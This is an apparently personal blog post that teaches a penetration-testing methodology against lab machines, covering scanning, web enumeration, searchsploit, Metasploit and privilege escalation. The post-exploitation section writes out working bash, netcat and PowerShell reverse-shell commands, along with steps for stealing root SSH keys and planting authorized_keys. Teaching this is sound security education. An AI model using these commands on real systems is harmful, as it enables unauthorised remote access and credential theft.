---
layout: single
title:  "Penetration Testing Methodology"
author_profile: true
toc: true
toc_label: "Table of Contents"
toc_icon: "fas fa-book-open"
toc_sticky: true
future: true
header:
    image: https://sites.breakingmedia.com/uploads/sites/3/2022/05/220524_cybersecurity_north_america_GettyImages-1213223956-scaled.jpg
    caption: "Photo by [**Theresa Hitchens**](https://breakingdefense.com/author/thitchens/) on [**Breaking Defense**](https://breakingdefense.com/2023/03/new-watch-center-to-ring-alarms-on-space-related-cyber-threats/)"
    teaser: https://sites.breakingmedia.com/uploads/sites/3/2022/05/220524_cybersecurity_north_america_GettyImages-1213223956-scaled-1024x576.jpg
---

In this post I am going to share some penetration testing process which I use when conducting a general pentest or tackling Boot2Root machines.
## Introduction
The [OWASP website](https://owasp.org/www-project-web-security-testing-guide/latest/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies#penetration-testing-execution-standard) greatly summarises the penetration testing methodologies in terms of the standards and guides available.

We will be looking at the Penetration Testing Execution Standard (PTES) which defines pentest as 7 phases. Specifically, they are:
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

## Pre-engagement Interactions
Pre-engagement interaction gives you an overview of what you will be dealing with. It could be the type of penetration test to be conducted, such as:
1. Black-box testing
2. Grey-box testing
3. White-box testing

You should know who is your target in this phase. 

In this post, PwnTillDawn's machine ([10.150.150.18](https://online.pwntilldawn.com/Account/Login?ReturnUrl=%2f)) will be our target.

## Reconnaissance/ Intelligence Gathering

Reconnaissance is perhaps the most crucial step during penetration testing. Knowing our target's infrastructure, services as well as technologies used gives us a much clearer understanding of our target and our attack landscape.

### Service Scanning

Service scanning allows us know what applications are running on a computer. These services may be outdated thus carrying a vulnerability which can be exploited or they simply can be misconfigured.

#### Nmap

Nmap (Network Mapper) allows us to scan the target's port numbers or the targets which are present in the network.

```
nmap -sC -sV -v 10.150.150.18
```

> -sC specifies that Nmap scripts should be used to try and obtain more detailed information. <br><br>-sV instructs Nmap to perform a version scan. <br><br>[Learn more](https://nmap.org/book/man-briefoptions.html)

In this scan, Nmap will fingerprint services on the target system and identify the service protocol, application name, and version.

```
nmap -sC -sV -v 10.150.150.18

Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-30 11:44 +08
Nmap scan report for 10.150.150.18
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
|   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
|_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.12 seconds
```

By default, Nmap will only scan the 1,000 most common ports by default. To scan all 65,535 ports, we can use the -p- tag.

Nmap is incredibly powerful with other features for attacking network services such as banner grabbing. Using Nmap script also allows us to check for specific vulnerability such as Citrix NetScaler (CVE-2019–19781). 

We are barely scratching the surface!

#### Rustscan

Rustscan is sometimes preferred for me as it scans faster and its output can serve as a cross-reference to Nmap's.

```
rustscan -a 10.150.150.18 --range 1-65535 --ulimit 5000
```

#### Attacking Network Services

After scanning, certain ports may be open such as FTP, SMB or SNMP. These services may contain sensitive data or credentials for us to further login to the system.

| Port | Services | Connect |
| :----: | :--------: | :-------: |
| 21 | FTP | ftp -p 10.150.150.18 |
| 445| SMB | smbclient -N -L \\\\\\\\10.150.150.18 |

### Web Enumeration

Often times, our target machine will usually have ports 80 (HTTP) and 443 (HTTPS) open. This means we may visit the target ip address on our browser and we should see a web application running.

We should always check for any hidden directories, subdomains or files on the webserver that are not intended for public access. Tools such as FFUF, GoBuster or DirBuster can be used to perform such directory enumeration.

We will be exploring FFUF for this article.

#### [Ffuf](https://github.com/ffuf/ffuf)

Below is a usage example:
```
ffuf -w /path/to/wordlist -u https://target/FUZZ
```

```
ffuf -u http://10.150.150.18/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```

> [SecLists Github](https://github.com/danielmiessler/SecLists) repository contains many useful lists for fuzzing and exploitation!

##### Directory / File Enumeration
Here, the “FUZZ” keyword is used as a placeholder. Ffuf will try to hit the URL by replacing the word “FUZZ” with every word in the wordlist.

Assuming that the default virtualhost response size is 4242 bytes, we can filter out all the responses of that size (-fs 4242). 

There are more filter options which we can choose:
```
FILTER OPTIONS:
  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges
```
##### DNS Subdomain Enumeration
There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited.

```
curl -s -H "Host: nonexistent.ffuf.io.fi" http://ffuf.io.fi |wc -c
```
```
612   # Received output
```
Filter out responses of length 612

```
ffuf -c -w /path/to/wordlist -u http://ffuf.io.fi -H "Host: FUZZ.ffuf.io.fi" -fs 612
```

Be sure to add your newly discovered subdomain to the /etc/hosts file.

#### Tips

##### Banner Grabbing / Web Server Headers

We can use cURL to obtain server header information from the command line.

```
curl -IL 10.150.150.18
```

##### Whatweb

Whatweb is a command-line tool to help us extract the version of web server, frameworks and technologies used. These can help to narrow down the vulnerabilities which we could exploit.

```
whatweb 10.150.150.18
```

##### Certificates
SSL/TLS certificates are potential source of information if HTTPS is in use. In certain scenarios, you may find the email address of the company to perform a phishing attack.

##### Robots
A robots.txt file lets the search engine knows which resouces should or should not be allowed for indexing. It can contain information of privileged locations such as admin pages or private files.

##### Source Code
Last but not least, checking the source code of web pages may gives us some clues or even confidential information if we are lucky. These are carelessly left behind by developers and are usually commented.

## Exploitation
Now that we are clear on the services running on the ports which our target is running on, we can proceed to search for any exploits available for the running service.

### Public Exploits
Unsurprisingly, Google is one of the way to look for public exploits by simply searching for the application name appended with 'exploit'.
We can also utilize online exploit databases such as [ExploitDB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com).

### Searchsploit
Searchsploit enables us to search for public vulnerabilities/exploits for any application.

```
searchsploit cacti
```
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cacti - 'graph_view.php' Remote Command Execution (Metasploit)                                                                                                                                                               | php/webapps/16881.rb
Cacti 0.8.6-d - 'graph_view.php' Command Injection (Metasploit)                                                                                                                                                              | php/webapps/9911.rb
Cacti 0.8.6d - Remote Command Execution                                                                                                                                                                                      | php/webapps/1062.pl
Cacti 0.8.6i - 'cmd.php?popen()' Remote Injection                                                                                                                                                                            | php/webapps/3029.php
Cacti 0.8.6i - 'copy_cacti_user.php' SQL Injection Create Admin                                                                                                                                                              | php/webapps/3045.php
Cacti 0.8.7 (RedHat High Performance Computing [HPC]) - 'utilities.php?Filter' Cross-Site Scripting                                                                                                                          | php/webapps/34504.txt
Cacti 0.8.7 - '/index.php/sql.php?Login Action login_username' SQL Injection                                                                                                                                                 | php/webapps/31161.txt
Cacti 0.8.7 - 'data_input.php' Cross-Site Scripting                                                                                                                                                                          | php/webapps/33000.txt
Cacti 0.8.7 - 'graph.php?view_type' Cross-Site Scripting                                                                                                                                                                     | php/webapps/31157.txt
Cacti 0.8.7 - 'graph_view.php?filter' Cross-Site Scripting                                                                                                                                                                   | php/webapps/31158.txt
Cacti 0.8.7 - 'graph_view.php?graph_list' SQL Injection                                                                                                                                                                      | php/webapps/31156.txt
Cacti 0.8.7 - 'graph_xport.php?local_graph_id' SQL Injection                                                                                                                                                                 | php/webapps/31160.txt
Cacti 0.8.7 - 'tree.php' Multiple SQL Injections                                                                                                                                                                             | php/webapps/31159.txt
Cacti 0.8.7e - Multiple Vulnerabilities                                                                                                                                                                                      | php/webapps/10234.txt
Cacti 0.8.7e - OS Command Injection                                                                                                                                                                                          | php/webapps/12339.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Copy to Clipboard
After finding a suitable exploit, we can use `-p` to obtain more information about it. The exploit's complete path will also be copied to your clipboard.
#### Copy to Folder
As altering exploits in our local copy of database is discouraged, using the `-m` option enables us to select as many exploits we like to be copied into our current working directory. 

### Metasploit
Metasploit contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. 
To run Metasploit, we can use the msfconsole command:
```
msfconsole
```

Once we have Metasploit running, we can search for our target application with the 'search' command.
```
msf6 > search eternalblue
```
```
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
Once we have identified the exploit we want to use, we can simply key in the command 'use' follow by the number identified for the exploit:

```
use 4
```
Once we have chosen our exploit, we need to configure its options. To view the options available, we can use the 'show options' command:
```
msf6 exploit(windows/smb/smb_doublepulsar_rce) > show options

Module options (exploit/windows/smb/smb_doublepulsar_rce):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   445              yes       The SMB service port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```
Any option with 'Required' set to 'yes' needs to be set for the exploit to work. <br>In this case, we only have two options to set: RHOSTS and LHOST. <br><br>RHOSTS refers to the IP of our target (IP, multiple IPs, or a file containing a list of IPs). LHOST refers to our host machine. <br>They are configured with the `set` command:

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

> You may have to run `ifconfig` to obtain the ip address of your LHOST. 

Once we have both options set, we can start the exploitation via the `run` or `exploit` command:

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

## Post Exploitation
Once we have successfully exploited our target, we need a way to communicate with the target machine to further continue our enumeration process. It is not practical having to exploit the same vulnerability just to execute each command, especially if we exploited our target via manual Remote Code Execution (RCE). 

> Connecting to network services such as SSH (Linux) or WinRM (Windows) also enables us to interact with target machine. However, unless we have the login credentials, such methods deem unfeasible.

### Gaining Foothold
To achieve reliable and proper communication, we need direct access to our target's system shell.

#### Reverse Shell
After identifying the vulnerability on our target which allows RCE, we shall first:
1. Spawn a netcat listener on our machine listening on a specific port (eg. port 9999)
```
nc -nlvp 9999
```
We now have a netcat listener waiting for a connection. We will trigger the reverse shell connection from the target machine back to our host machine with the netcat listener.

2. Execute the reverse shell command via the exploited vulnerability
The command to execute depends on the operating system which our target is running. Some reverse shell commands can be more reliable than others.
Bash code for Linux compromised hosts:
```
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```
OR
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
Powershell code for Windows compromised hosts
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
The key is utilizing the exploit we have over the remote host to execute one of the above reverse shell commands.

> There are other shells such as Bind Shell and Web Shell. For more reverse shell commands which cover more types of compromised host, check out [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).<br>

#### Upgrading your shell
You may realize that after gaining a shell, its functionalities are limited compared to our shell in our own terminal. We need to upgrade our TTY which is achieved via mapping our terminal TTY with the target's TTY.

To learn more, view [Upgrading your Reverse Shell](https://nickchua.com/2023/12/07/Upgrading-your-reverse-shell.html).

### Privilege Escalation
Even after gaining access to our target system through a shell, we are usually in the context of a low-privileged user. Our access is therefore limited, which restricts our access over the entire machine.

To gain full access, we need to find an internal vulnerability that would escalate our privileges to the root user on Linux or the administrator/SYSTEM user on Windows.

#### PrivEsc Checklists
There are several incredible resources which have a collection of checks for us to enumerate the target machine to find any potential vulnerabilities to escalate our privileges.

They are: [HackTricks](https://book.hacktricks.xyz/welcome/readme), [GTFOBins](https://gtfobins.github.io), [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/) and more.

#### Scripts
A great way to automatically enumerate the target machine for ways to escalate our privilege is to run scripts. These scripts work by automatically executing commands which look for interesting findings, weaknesses or misconfigurations.

Linux enumerations scripts: LinPEAS, LinEnum and linuxprivchecker

Windows enumerations scripts: WinPEAS, Seatbelt and JAWS

#### Techniques
Below are some common scenarios in which privilege escalation can occur:

##### Current Privileges
Checking the privileges available to the user which we have access to the system is paramount. If we can run commands as root or another user, we can escalate our privileges to the other user respectively.
Here are some common ways to escalate current user privileges:
1. Sudo
2. SUID
3. Windows Token Privileges
The `sudo` command in Linux allows a user to execute a command as another user (default: superuser), without giving them the identity of the root user. 
To check the `sudo` privileges we have:
```
sudo -l
```
If the output allows all commands to be ran with `sudo`, we can subsequently use this command to switch to the root user:
```
sudo su -
```
However, you may realize that we need a password to run the above command with `sudo`. There are cases where some programs can be executed without having to provide a password:
```
sudo -l
(user : user) NOPASSWD: /bin/cat
```
The NOPASSWD entry shows that the /bin/cat command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. To do so, we can specify the user with `-u user`:
```
sudo -u user /bin/cat random_file.txt
```
Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user.
> [GTFOBins](https://gtfobins.github.io) allows us to search for applications which we have `sudo` privilege and tell us the exact command we should execute to gain root access.<br><br>
[LOLBAS](https://lolbas-project.github.io/#) contains a list of Windows applications which we may be able to leverage to perform certain functions in the context of a privileged user.

##### Outdated Kernel
An outdated kernel can be targetted by kernel exploits. A target server running an old OS without the latest patches are susceptible to kernel exploits found on unpatched versions of Linux and Windows.

##### Vulnerable Software
Installed software may also pose a threat to target system. To look for installed software on the system:

On Linux, run:
```
dpkg -l
```
On Windows, look under:
```
C:\Program Files
```

##### Scheduled Tasks
Both Linux and Windows OS are able to run tasks at fixed intervals. This can happen through methods such as a script running (eg: every 1 hour). There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. 

There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:
1. /etc/cron.d
2. /etc/crontab
3. /var/spool/cron/crontabs/root

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

##### Exposed Credentials
Exposed credentials are common in configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). These credentials might be reused which allows us to switch to that user using the same password:
```
$ su -

Password: 123456
whoami

root
```
or SSH into the target machine as that user.

##### SSH Keys
If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
```
$ vim id_rsa
$ chmod 600 id_rsa
$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```
If we find ourselves with write access to a users `/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
```
$ ssh-keygen -f key
```
This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
```
$ echo "ssh-rsa AAAAB...SNIP...M= user@ownmachine" >> /root/.ssh/authorized_keys
```
Now, the remote server should allow us to log in as that user by using our private key:
```
$ ssh root@10.10.10.10 -i key

root@remotehost#
```
We can now SSH into the target machine as the user `root`.

## Credits
Certain sections from this post were adapted from the **Getting Started** module from [HTB Academy](https://academy.hackthebox.com). 

The module gives a fantastic introduction to Penetration Testing, which I highly recommend anyone to check it out. This post also helps to summarize some knowledge from there for easy reference.

Thank you for the read and I truly appreciate you for making it this far.